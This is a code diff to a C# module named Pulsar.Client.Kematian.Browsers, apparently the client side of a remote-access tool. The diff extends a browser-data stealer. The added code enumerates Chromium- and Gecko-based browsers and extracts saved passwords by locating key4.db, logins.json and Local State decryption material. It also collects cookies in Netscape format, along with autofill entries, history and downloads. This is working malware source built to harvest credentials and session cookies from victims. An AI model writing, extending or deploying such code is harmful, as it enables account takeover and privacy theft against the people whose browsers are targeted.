@@ -3,6 +3,9 @@ using Pulsar.Client.Kematian.Browsers.Chromium.Cookies;
 using Pulsar.Client.Kematian.Browsers.Chromium.Downloads;
 using Pulsar.Client.Kematian.Browsers.Chromium.History;
 using Pulsar.Client.Kematian.Browsers.Chromium.Passwords;
+using Pulsar.Client.Kematian.Browsers.Gecko.Autofill;
+using Pulsar.Client.Kematian.Browsers.Gecko.Cookies;
+using Pulsar.Client.Kematian.Browsers.Gecko.Downloads;
 using Pulsar.Client.Kematian.Browsers.Gecko.History;
 using Pulsar.Client.Kematian.Browsers.Gecko.Passwords;
 using Pulsar.Client.Kematian.Browsers.Helpers;
@@ -12,10 +15,25 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Threading.Tasks;
 
 namespace Pulsar.Client.Kematian.Browsers
 {
+    /// <summary>
+    /// Represents a browser found on the system for organizing data
+    /// </summary>
+    public class BrowserInfo
+    {
+        public string Name { get; set; }
+        public string Path { get; set; }
+        public string Type { get; set; }
+        public object Data { get; set; }
+        
+        public bool IsChromium => Type == "Chromium";
+        public bool IsGecko => Type == "Gecko";
+    }
+
     public class BrowsersRetriever
     {
         private readonly List<ChromiumBrowserPath> _chromiumBrowsers;
@@ -23,10 +41,8 @@ namespace Pulsar.Client.Kematian.Browsers
 
         public BrowsersRetriever()
         {
-            // Initialize the optimized crawler
             Crawler crawler = new Crawler();
 
-            // Get browsers in parallel to further optimize startup time
             var chromiumTask = Task.Run(() => crawler.GetChromiumBrowsers());
             var geckoTask = Task.Run(() => crawler.GetGeckoBrowsers());
 
@@ -34,10 +50,430 @@ namespace Pulsar.Client.Kematian.Browsers
 
             _chromiumBrowsers = chromiumTask.Result;
             _geckoBrowsers = geckoTask.Result;
-
-            Debug.WriteLine($"Found {_chromiumBrowsers.Count} Chromium browsers");
-            Debug.WriteLine($"Found {_geckoBrowsers.Count} Gecko browsers");
         }
+
+        /// <summary>
+        /// Returns a list of browsers found on the system
+        /// </summary>
+        public List<BrowserInfo> GetBrowserList()
+        {
+            var browsers = new List<BrowserInfo>();
+            var browserPaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+
+            foreach (var browser in _chromiumBrowsers)
+            {
+                string browserName = GetBrowserNameFromPath(browser.ProfilePath);
+                string path = browser.ProfilePath.ToLowerInvariant();
+                
+                if (browserPaths.Contains(path))
+                {
+                    continue;
+                }
+                
+                browserPaths.Add(path);
+                
+                browsers.Add(new BrowserInfo
+                {
+                    Name = browserName,
+                    Path = browser.ProfilePath,
+                    Type = "Chromium",
+                    Data = browser
+                });
+            }
+
+            var geckoBrowserGroups = _geckoBrowsers
+                .GroupBy(b => GetBrowserNameFromPath(b.ProfilesPath))
+                .ToList();
+            
+            var processedBrowserNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+            
+            foreach (var browserGroup in geckoBrowserGroups)
+            {
+                string browserName = browserGroup.Key;
+                
+                if (processedBrowserNames.Contains(browserName))
+                {
+                    continue;
+                }
+                
+                var browser = browserGroup.First();
+                
+                HashSet<string> profilePaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+                List<GeckoProfile> uniqueProfiles = new List<GeckoProfile>();
+                
+                foreach (var browserInstance in browserGroup)
+                {
+                    foreach (var profile in browserInstance.Profiles)
+                    {
+                        if (!profilePaths.Contains(profile.Path))
+                        {
+                            profilePaths.Add(profile.Path);
+                            uniqueProfiles.Add(profile);
+                        }
+                    }
+                }
+                
+                var consolidatedBrowser = new GeckoBrowserPath
+                {
+                    ProfilesPath = browser.ProfilesPath,
+                    Profiles = uniqueProfiles.ToArray()
+                };
+                
+                processedBrowserNames.Add(browserName);
+                
+                browsers.Add(new BrowserInfo
+                {
+                    Name = browserName,
+                    Path = browser.ProfilesPath,
+                    Type = "Gecko",
+                    Data = consolidatedBrowser
+                });
+            }
+
+            return browsers;
+        }
+
+        /// <summary>
+        /// Extracts browser name from its path
+        /// </summary>
+        private string GetBrowserNameFromPath(string path)
+        {
+            try
+            {
+                string[] knownBrowsers = new[] {
+                    "Chrome", "Brave", "Edge", "Opera", "Vivaldi", "Firefox", 
+                    "Chromium", "Epic", "Yandex", "Iridium", "UCBrowser", "CentBrowser",
+                    "LibreWolf", "Librewolf", "Zen Browser", "zen", "Waterfox", "Pale Moon"
+                };
+
+                foreach (var browser in knownBrowsers)
+                {
+                    if (path.IndexOf(browser, StringComparison.OrdinalIgnoreCase) >= 0)
+                    {
+                        if (browser.Equals("zen", StringComparison.OrdinalIgnoreCase) &&
+                            !browser.Equals("Zen Browser", StringComparison.OrdinalIgnoreCase))
+                        {
+                            return "Zen Browser";
+                        }
+                        
+                        if (browser.Equals("librewolf", StringComparison.OrdinalIgnoreCase) &&
+                            !browser.Equals("LibreWolf", StringComparison.OrdinalIgnoreCase))
+                        {
+                            return "LibreWolf";
+                        }
+                        
+                        return browser;
+                    }
+                }
+
+                if (path.IndexOf("Profiles", StringComparison.OrdinalIgnoreCase) >= 0)
+                {
+                    var profilesIndex = path.IndexOf("Profiles", StringComparison.OrdinalIgnoreCase);
+                    var parentPath = path.Substring(0, profilesIndex).TrimEnd('\\', '/');
+                    var dirName = Path.GetFileName(parentPath);
+                    
+                    if (!string.IsNullOrEmpty(dirName))
+                    {
+                        if (dirName.Equals("zen", StringComparison.OrdinalIgnoreCase))
+                            return "Zen Browser";
+                        if (dirName.Equals("librewolf", StringComparison.OrdinalIgnoreCase))
+                            return "LibreWolf";
+                            
+                        return dirName;
+                    }
+                }
+
+                string directoryName = Path.GetFileName(Path.GetDirectoryName(path));
+                if (!string.IsNullOrEmpty(directoryName))
+                {
+                    if (directoryName.Equals("zen", StringComparison.OrdinalIgnoreCase))
+                        return "Zen Browser";
+                    if (directoryName.Equals("librewolf", StringComparison.OrdinalIgnoreCase))
+                        return "LibreWolf";
+                        
+                    return directoryName;
+                }
+
+                return "Unknown";
+            }
+            catch
+            {
+                return "Unknown";
+            }
+        }
+
+        #region Browser-specific methods
+
+        /// <summary>
+        /// Gets cookies for a specific browser
+        /// </summary>
+        public string GetCookiesForBrowser(BrowserInfo browser)
+        {
+            try
+            {
+                if (browser.IsChromium && browser.Data != null)
+                {
+                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                    
+                    var result = new List<string>();
+                    foreach (var profile in chromiumBrowser.Profiles)
+                    {
+                        result.AddRange(GetChromiumCookies(profile, chromiumBrowser.LocalStatePath));
+                    }
+                    return string.Join(Environment.NewLine, result);
+                }
+                else if (browser.IsGecko && browser.Data != null)
+                {
+                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                    
+                    var result = new List<string>();
+                    foreach (var profile in geckoBrowser.Profiles)
+                    {
+                        result.AddRange(GetGeckoCookies(profile));
+                    }
+                    return string.Join(Environment.NewLine, result);
+                }
+
+                return string.Empty;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error retrieving cookies for {browser.Name}: {ex.Message}");
+                return string.Empty;
+            }
+        }
+
+        /// <summary>
+        /// Gets history for a specific browser
+        /// </summary>
+        public string GetHistoryForBrowser(BrowserInfo browser)
+        {
+            try
+            {
+                var allHistory = new List<Dictionary<string, string>>();
+
+                if (browser.IsChromium && browser.Data != null)
+                {
+                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in chromiumBrowser.Profiles)
+                    {
+                        tasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
+                    }
+
+                    Task.WaitAll(tasks.ToArray());
+                    foreach (var task in tasks)
+                    {
+                        allHistory.AddRange(task.Result);
+                    }
+                }
+                else if (browser.IsGecko && browser.Data != null)
+                {
+                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in geckoBrowser.Profiles)
+                    {
+                        tasks.Add(Task.Run(() => GetGeckoHistoryForProfile(profile)));
+                    }
+
+                    Task.WaitAll(tasks.ToArray());
+                    foreach (var task in tasks)
+                    {
+                        allHistory.AddRange(task.Result);
+                    }
+                }
+
+                return allHistory.Count > 0
+                    ? (allHistory.Count > 1000 
+                        ? Serializer.SerializeDataInBatches(allHistory, 1000) 
+                        : Serializer.SerializeData(allHistory))
+                    : "[]";
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error retrieving history for {browser.Name}: {ex.Message}");
+                return "[]";
+            }
+        }
+
+        /// <summary>
+        /// Gets passwords for a specific browser
+        /// </summary>
+        public string GetPasswordsForBrowser(BrowserInfo browser)
+        {
+            try
+            {
+                var allPasswords = new List<Dictionary<string, string>>();
+
+                if (browser.IsChromium && browser.Data != null)
+                {
+                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in chromiumBrowser.Profiles)
+                    {
+                        if (profile.LoginData != null && File.Exists(profile.LoginData) && 
+                            !string.IsNullOrEmpty(chromiumBrowser.LocalStatePath))
+                        {
+                            tasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, chromiumBrowser.LocalStatePath)));
+                        }
+                    }
+
+                    if (tasks.Count > 0)
+                    {
+                        Task.WaitAll(tasks.ToArray());
+                        foreach (var task in tasks)
+                        {
+                            if (task != null && task.Result != null)
+                            {
+                                allPasswords.AddRange(task.Result);
+                            }
+                        }
+                    }
+                }
+                else if (browser.IsGecko && browser.Data != null)
+                {
+                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                    
+                    foreach (var profile in geckoBrowser.Profiles)
+                    {
+                        if (profile.Path != null && Directory.Exists(profile.Path))
+                        {
+                            var geckoPasswords = GetGeckoPasswordsForProfile(profile);
+                            if (geckoPasswords != null)
+                            {
+                                allPasswords.AddRange(geckoPasswords);
+                            }
+                        }
+                    }
+                }
+
+                return allPasswords.Count > 0
+                    ? (allPasswords.Count > 1000 
+                        ? Serializer.SerializeDataInBatches(allPasswords, 1000) 
+                        : Serializer.SerializeData(allPasswords))
+                    : "[]";
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error retrieving passwords for {browser.Name}: {ex.Message}");
+                return "[]";
+            }
+        }
+
+        /// <summary>
+        /// Gets autofill data for a specific browser
+        /// </summary>
+        public string GetAutoFillForBrowser(BrowserInfo browser)
+        {
+            try
+            {
+                var allAutoFillData = new List<Dictionary<string, string>>();
+
+                if (browser.IsChromium && browser.Data != null)
+                {
+                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in chromiumBrowser.Profiles)
+                    {
+                        tasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
+                    }
+
+                    Task.WaitAll(tasks.ToArray());
+                    foreach (var task in tasks)
+                    {
+                        allAutoFillData.AddRange(task.Result);
+                    }
+                }
+                else if (browser.IsGecko && browser.Data != null)
+                {
+                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in geckoBrowser.Profiles)
+                    {
+                        tasks.Add(Task.Run(() => GetGeckoAutofillForProfile(profile)));
+                    }
+
+                    Task.WaitAll(tasks.ToArray());
+                    foreach (var task in tasks)
+                    {
+                        allAutoFillData.AddRange(task.Result);
+                    }
+                }
+
+                return allAutoFillData.Count > 0
+                    ? (allAutoFillData.Count > 1000 
+                        ? Serializer.SerializeDataInBatches(allAutoFillData, 1000) 
+                        : Serializer.SerializeData(allAutoFillData))
+                    : "[]";
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error retrieving autofill data for {browser.Name}: {ex.Message}");
+                return "[]";
+            }
+        }
+
+        /// <summary>
+        /// Gets downloads for a specific browser
+        /// </summary>
+        public string GetDownloadsForBrowser(BrowserInfo browser)
+        {
+            try
+            {
+                var allDownloads = new List<Dictionary<string, string>>();
+
+                if (browser.IsChromium && browser.Data != null)
+                {
+                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in chromiumBrowser.Profiles)
+                    {
+                        tasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
+                    }
+
+                    Task.WaitAll(tasks.ToArray());
+                    foreach (var task in tasks)
+                    {
+                        allDownloads.AddRange(task.Result);
+                    }
+                }
+                else if (browser.IsGecko && browser.Data != null)
+                {
+                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                    
+                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                    foreach (var profile in geckoBrowser.Profiles)
+                    {
+                        tasks.Add(Task.Run(() => GetGeckoDownloadsForProfile(profile)));
+                    }
+
+                    Task.WaitAll(tasks.ToArray());
+                    foreach (var task in tasks)
+                    {
+                        allDownloads.AddRange(task.Result);
+                    }
+                }
+
+                return allDownloads.Count > 0
+                    ? (allDownloads.Count > 1000 
+                        ? Serializer.SerializeDataInBatches(allDownloads, 1000) 
+                        : Serializer.SerializeData(allDownloads))
+                    : "[]";
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error retrieving downloads for {browser.Name}: {ex.Message}");
+                return "[]";
+            }
+        }
+
+        #endregion
 
         public string GetHistory()
         {
@@ -128,6 +564,7 @@ namespace Pulsar.Client.Kematian.Browsers
                 if (profile.History != null && System.IO.File.Exists(profile.History))
                 {
                     var history = HistoryGecko.GetHistoryGecko(profile.History);
+                    
                     foreach (var entry in history)
                     {
                         var newEntry = new Dictionary<string, string>
@@ -226,7 +663,15 @@ namespace Pulsar.Client.Kematian.Browsers
                 {
                     foreach (var profile in browser.Profiles)
                     {
-                        cookieTasks.Add(Task.Run(() => GetChromiumCookiesForProfile(profile, browser.LocalStatePath)));
+                        cookieTasks.Add(Task.Run(() => GetChromiumCookies(profile, browser.LocalStatePath)));
+                    }
+                }
+                
+                foreach (var browser in _geckoBrowsers)
+                {
+                    foreach (var profile in browser.Profiles)
+                    {
+                        cookieTasks.Add(Task.Run(() => GetGeckoCookies(profile)));
                     }
                 }
 
@@ -248,7 +693,7 @@ namespace Pulsar.Client.Kematian.Browsers
             }
         }
 
-        private List<string> GetChromiumCookiesForProfile(ChromiumProfile profile, string localStatePath)
+        private List<string> GetChromiumCookies(ChromiumProfile profile, string localStatePath)
         {
             var result = new List<string>();
             try
@@ -256,6 +701,7 @@ namespace Pulsar.Client.Kematian.Browsers
                 if (profile.Cookies != null && System.IO.File.Exists(profile.Cookies))
                 {
                     var cookies = CookiesChromium.GetCookies(profile.Cookies, localStatePath);
+                    
                     foreach (var cookie in cookies)
                     {
                         var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
@@ -266,6 +712,29 @@ namespace Pulsar.Client.Kematian.Browsers
             catch (Exception ex)
             {
                 Debug.WriteLine($"Error processing Chromium cookies for profile {profile.Name}: {ex.Message}");
+            }
+            return result;
+        }
+        
+        private List<string> GetGeckoCookies(GeckoProfile profile)
+        {
+            var result = new List<string>();
+            try
+            {
+                if (profile.Cookies != null && System.IO.File.Exists(profile.Cookies))
+                {
+                    var cookies = CookiesGecko.GetCookies(profile.Cookies);
+                    
+                    foreach (var cookie in cookies)
+                    {
+                        var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
+                        result.Add(netscapeCookie);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing Gecko cookies for profile {profile.Name}: {ex.Message}");
             }
             return result;
         }
@@ -445,25 +914,69 @@ namespace Pulsar.Client.Kematian.Browsers
         private List<Dictionary<string, string>> GetGeckoPasswordsForProfile(GeckoProfile profile)
         {
             var result = new List<Dictionary<string, string>>();
+            
+            try
+            {
             bool signonsFound = false;
             bool loginsFound = false;
+                bool key4Found = false;
+                
+                string signonsPath = null;
+                string loginsPath = null;
+                string key4Path = null;
 
-            string[] signons = Directory.GetFiles(profile.Path, "signons.sqlite");
+                if (File.Exists(profile.Key4DB))
+                {
+                    key4Found = true;
+                    key4Path = profile.Key4DB;
+                }
+
+                if (File.Exists(profile.LoginsJson))
+                {
+                    loginsFound = true;
+                    loginsPath = profile.LoginsJson;
+                }
+
+                if (!key4Found || !loginsFound)
+                {
+                    string[] signons = Directory.GetFiles(profile.Path, "signons.sqlite", SearchOption.AllDirectories);
             if (signons.Length > 0)
             {
                 signonsFound = true;
-            }
+                        signonsPath = signons[0];
+                    }
 
-            string[] files = Directory.GetFiles(profile.Path, "logins.json");
-            if (files.Length > 0)
+                    if (!loginsFound)
+                    {
+                        string[] logins = Directory.GetFiles(profile.Path, "logins.json", SearchOption.AllDirectories);
+                        if (logins.Length > 0)
             {
                 loginsFound = true;
-            }
+                            loginsPath = logins[0];
+                        }
+                    }
+                    
+                    if (!key4Found)
+                    {
+                        string[] key4Files = Directory.GetFiles(profile.Path, "key4.db", SearchOption.AllDirectories);
+                        if (key4Files.Length > 0)
+                        {
+                            key4Found = true;
+                            key4Path = key4Files[0];
+                        }
+                    }
+                }
 
-            if (loginsFound || signonsFound)
-            {
+                if ((loginsFound || signonsFound) && key4Found)
+                {
+                    string nssInitPath = Path.GetDirectoryName(key4Path);
+                    
                 var geckoLogins = new PasswordsGecko();
-                var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson, signonsFound ? signons[0] : null);
+                    var passwords = geckoLogins.GetLogins(
+                        nssInitPath, 
+                        loginsFound ? loginsPath : null, 
+                        signonsFound ? signonsPath : null
+                    );
                 geckoLogins.Dispose();
 
                 foreach (var entry in passwords)
@@ -476,6 +989,229 @@ namespace Pulsar.Client.Kematian.Browsers
                     };
                     result.Add(newEntry);
                 }
+                    
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing Gecko passwords for profile {profile.Name}: {ex.Message}");
+            }
+            
+            return result;
+        }
+        
+        private string GetBrowserName(string path)
+        {
+            if (path.IndexOf("librewolf", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "LibreWolf";
+            }
+            else if (path.IndexOf("firefox", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Firefox";
+            }
+            else if (path.IndexOf("zen", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Zen Browser";
+            }
+            else if (path.IndexOf("waterfox", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Waterfox";
+            }
+            else if (path.IndexOf("palemoon", StringComparison.OrdinalIgnoreCase) >= 0 || 
+                     path.IndexOf("pale moon", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Pale Moon";
+            }
+            else if (path.IndexOf("seamonkey", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "SeaMonkey";
+            }
+            else if (path.IndexOf("chrome", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Chrome";
+            }
+            else if (path.IndexOf("edge", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Edge";
+            }
+            else if (path.IndexOf("brave", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Brave";
+            }
+            else if (path.IndexOf("opera gx", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Opera GX";
+            }
+            else if (path.IndexOf("opera", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Opera";
+            }
+            else if (path.IndexOf("vivaldi", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Vivaldi";
+            }
+            else if (path.IndexOf("chromium", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Chromium";
+            }
+            else if (path.IndexOf("epic", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Epic Browser";
+            }
+            else if (path.IndexOf("yandex", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Yandex Browser";
+            }
+            else if (path.IndexOf("iridium", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "Iridium Browser";
+            }
+            else if (path.IndexOf("ucbrowser", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "UCBrowser";
+            }
+            else if (path.IndexOf("centbrowser", StringComparison.OrdinalIgnoreCase) >= 0)
+            {
+                return "CentBrowser";
+            }
+            
+            return null;
+        }
+
+        private List<Dictionary<string, string>> GetGeckoAutofillForProfile(GeckoProfile profile)
+        {
+            var result = new List<Dictionary<string, string>>();
+            try
+            {
+                string formHistoryPath = Path.Combine(profile.Path, "formhistory.sqlite");
+                if (!File.Exists(formHistoryPath))
+                {
+                    
+                    string[] formHistoryFiles = Directory.GetFiles(profile.Path, "formhistory.sqlite", SearchOption.AllDirectories);
+                    if (formHistoryFiles.Length > 0)
+                    {
+                        formHistoryPath = formHistoryFiles[0];
+                    }
+                    else 
+                    {
+                        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                        string browserName = null;
+
+                        browserName = GetBrowserName(profile.Path);
+                        
+                        if (browserName != null)
+                        {
+                            string[] possiblePaths = {
+                                Path.Combine(appDataPath, browserName),
+                                Path.Combine(appDataPath, "Mozilla", browserName),
+                                Path.Combine(appDataPath, "Mozilla", "Firefox")
+                            };
+                            
+                            foreach (var path in possiblePaths)
+                            {
+                                if (Directory.Exists(path))
+                                {
+                                    string[] files = Directory.GetFiles(path, "formhistory.sqlite", SearchOption.AllDirectories);
+                                    if (files.Length > 0)
+                                    {
+                                        formHistoryPath = files[0];
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                if (File.Exists(formHistoryPath))
+                {
+                    var autofillData = AutofillGecko.GetAutofill(formHistoryPath);
+                    
+                    foreach (var entry in autofillData)
+                    {
+                        var newEntry = new Dictionary<string, string>
+                        {
+                            {"Name", entry.Name},
+                            {"Value", entry.Value},
+                            {"Value_lower", entry.Value_lower},
+                            {"Date_created", entry.Date_created},
+                            {"Date_last_used", entry.Date_last_used},
+                            {"Count", entry.Count}
+                        };
+                        result.Add(newEntry);
+                    }
+                }
+                else
+                {
+
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing Gecko autofill for profile {profile.Name}: {ex.Message}");
+            }
+            return result;
+        }
+        
+        private List<Dictionary<string, string>> GetGeckoDownloadsForProfile(GeckoProfile profile)
+        {
+            var result = new List<Dictionary<string, string>>();
+            try
+            {
+                string placesDbPath = null;
+                
+                if (profile.History != null && File.Exists(profile.History) && 
+                    profile.History.EndsWith("places.sqlite", StringComparison.OrdinalIgnoreCase))
+                {
+                    placesDbPath = profile.History;
+                }
+                else
+                {
+                    string[] placesFiles = Directory.GetFiles(profile.Path, "places.sqlite", SearchOption.AllDirectories);
+                    if (placesFiles.Length > 0)
+                    {
+                        placesDbPath = placesFiles[0];
+                    }
+                    else
+                    {
+                        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                        string browserName = null;
+
+                        browserName = GetBrowserName(profile.Path);
+                    }
+                }
+                
+                if (placesDbPath != null && File.Exists(placesDbPath))
+                {
+                    var downloads = DownloadsGecko.GetDownloads(placesDbPath);
+                    
+                    foreach (var entry in downloads)
+                    {
+                        var newEntry = new Dictionary<string, string>
+                        {
+                            {"CurrentPath", entry.Current_path ?? string.Empty},
+                            {"TargetPath", entry.Target_path ?? string.Empty},
+                            {"StartTime", entry.Start_time ?? string.Empty},
+                            {"ReceivedBytes", entry.Received_bytes ?? string.Empty},
+                            {"TotalBytes", entry.Total_bytes ?? string.Empty},
+                            {"DangerType", entry.Danger_type ?? string.Empty},
+                            {"EndTime", entry.End_time ?? string.Empty},
+                            {"Opened", entry.Opened ?? string.Empty},
+                            {"LastAccessTime", entry.Last_access_time ?? string.Empty},
+                            {"Referrer", entry.Referrer ?? string.Empty},
+                            {"TabUrl", entry.Tab_url ?? string.Empty},
+                            {"TabReferrerUrl", entry.Tab_referrer_url ?? string.Empty},
+                            {"MimeType", entry.Mime_type ?? string.Empty},
+                            {"OriginalMimeType", entry.Original_mime_type ?? string.Empty}
+                        };
+                        result.Add(newEntry);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+
             }
             return result;
         }
